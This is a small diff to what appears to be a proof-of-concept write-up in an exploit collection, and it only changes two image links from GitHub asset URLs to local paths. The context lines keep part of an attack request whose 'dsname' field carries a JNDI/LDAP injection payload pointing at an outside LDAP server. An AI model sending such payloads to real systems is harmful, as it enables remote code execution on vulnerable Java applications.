@@ -17,6 +17,6 @@ Content-Length: 68
 type=1&dsname=ldap://172.17.176.1:8085/blvVEcJU1
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/1aac8d1d-b2c5-4f2d-af47-97c363a59274)
+![image](../../images/1aac8d1d-b2c5-4f2d-af47-97c363a59274.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/e7c8e733-01fc-468b-9acc-b4de63428cdc)
+![image](../../images/e7c8e733-01fc-468b-9acc-b4de63428cdc.png)
